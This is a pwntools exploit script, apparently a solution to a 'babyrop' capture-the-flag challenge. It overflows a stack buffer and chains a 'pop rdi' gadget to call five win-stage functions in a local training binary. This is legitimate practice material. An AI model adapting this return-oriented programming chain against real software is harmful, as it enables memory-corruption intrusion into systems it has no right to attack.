from pwn import * 

context.arch = 'amd64'
context.os = 'linux'

io = process('/challenge/babyrop_level3.1', level='DEBUG')

io.recvline()

# rp++ --file babyrop_level3.1 --rop 2 | grep -i "pop rdi"
pop_rdi = p64(0x401b33)

win_stage_1 = p64(0x4018f7)
win_stage_2 = p64(0x40164f)
win_stage_3 = p64(0x401815)
win_stage_4 = p64(0x40172f)
win_stage_5 = p64(0x40156c)

payload = b'A' * 32 + b'B' * 8 + pop_rdi + p64(0x01) + win_stage_1 + pop_rdi + p64(0x02) + win_stage_2 + pop_rdi + p64(0x03) + win_stage_3 + pop_rdi + p64(0x04) + win_stage_4 + pop_rdi + p64(0x05) + win_stage_5
io.sendline(payload)

io.recvline()
io.interactive()
